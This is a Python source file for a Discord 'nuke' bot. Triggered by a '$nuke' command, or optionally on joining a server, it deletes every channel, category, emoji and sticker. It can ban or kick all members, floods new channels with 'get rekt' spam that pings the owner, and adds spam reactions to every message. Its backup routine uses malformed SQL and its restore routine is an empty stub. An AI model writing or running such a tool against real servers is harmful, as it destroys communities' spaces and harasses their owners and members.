import discord
import sqlite3
import os

token = os.getenv('token')
intents = discord.Intents.default()
intents.members, intents.message_content = True, True
client = discord.Client(intents=intents)

new_server_name = "Rekt"
text_channel_name = "spam_text"
voice_channel_name = "spam_voice"
category_name = "spam_category"
spam_message = "get rekt"
spam_img = "spam_img.png"

num_spam_channels = 4

b_spam_text_channels = True
b_create_categories = True
b_create_voice_channels = True
b_create_text_channels = True
b_delete_text_channels = True
b_delete_voice_channels = True
b_delete_categories = True
b_ban_users = False
b_kick_users = False
b_delete_emojis = True
b_delete_stickers = True
b_spam_images = True
b_spam_reacts = True
b_nuke_on_join = False
b_nuke_on_command = True
b_backup = False
b_restore = False


async def backup(guild):
    con = sqlite3.connect("Nuke.db")
    cur = con.cursor()
    cur.execute(
        "CREATE IF NOT EXIST TABLE server(owner, server_name, emojis, stickers, categories, text_channels, voice_channels, members, messages)")


async def delete_channels(guild):
    if b_delete_text_channels:
        for channel in guild.text_channels:
            await channel.delete()
    if b_delete_voice_channels:
        for channel in guild.voice_channels:
            await channel.delete()
    if b_delete_categories:
        for category in guild.categories:
            await category.delete()


async def ban_or_kick(guild):
    for member in guild.members:
        if b_ban_users:
            await member.ban()
        elif b_kick_users:
            await member.kick()


async def delete_emojis(guild):
    for emoji in guild.emojis:
        await emoji.delete()


async def delete_stickers(guild):
    for sticker in guild.stickers:
        await sticker.delete()


async def create_channels(guild):
    for i in range(1, num_spam_channels + 1):
        cat = None
        if b_create_categories:
            cat = await guild.create_category(f"{category_name} {i}")
        if b_create_text_channels:
            await guild.create_text_channel(name=text_channel_name, category=cat)
        if b_create_voice_channels:
            await guild.create_voice_channel(name=voice_channel_name, category=cat)


async def spam(guild):
    for channel in guild.text_channels:
        if b_spam_text_channels:
            await channel.send(f"{spam_message}\n{guild.owner.mention}")
        if b_spam_images:
            await channel.send(file=discord.File(fp=spam_img))


async def nuke(guild):
    owner = guild.owner
    print(f'Nuking: {guild.name}\nOwned by: {owner.name}\nMembers: {len(guild.members)}')
    print(f'Nuke settings:\nDelete\nStickers: {b_delete_stickers}\nEmojis: {b_delete_emojis}\nText Channels: {b_delete_text_channels}\nVoice Channels: {b_delete_voice_channels}'
          f'\nCategories: {b_delete_categories}\nKick Members: {b_kick_users}'
          f'\nBan Members: {b_ban_users}\nCreate\nCategories: {b_create_categories}\nText channels: {b_create_text_channels}\nVoice channels: {b_create_voice_channels}\n'
          f'Spam\nText: {b_spam_text_channels}\nReactions: {b_spam_reacts}\nImage: {b_spam_images}')
    if b_delete_text_channels or b_delete_voice_channels or b_delete_categories:
        await delete_channels(guild)
    if b_ban_users or b_kick_users:
        await ban_or_kick(guild)
    if b_delete_emojis:
        await delete_emojis(guild)
    if b_delete_stickers:
        await delete_stickers(guild)
    if b_create_text_channels or b_create_voice_channels or b_create_categories:
        await create_channels(guild)
    if b_spam_text_channels or b_spam_images:
        await spam(guild)


async def restore(guild):
    ...


@client.event
async def on_ready():
    print(f'We have logged in as {client.user}')


@client.event
async def on_message(message):
    if b_nuke_on_command and message.content.startswith('$nuke'):
        await nuke(message.channel.guild)

    if b_spam_reacts:
        reactions = ['😂', '😀', '😘', '😇', '😅', '🤐', '😏']
        for reaction in reactions:
            try:
                await message.add_reaction(reaction)
            except discord.errors.NotFound:
                return


@client.event
async def on_guild_join(guild):
    if b_backup:
        await backup(guild)
    if b_nuke_on_join:
        await nuke(guild)


if __name__ == '__main__':
    client.run(token=token)
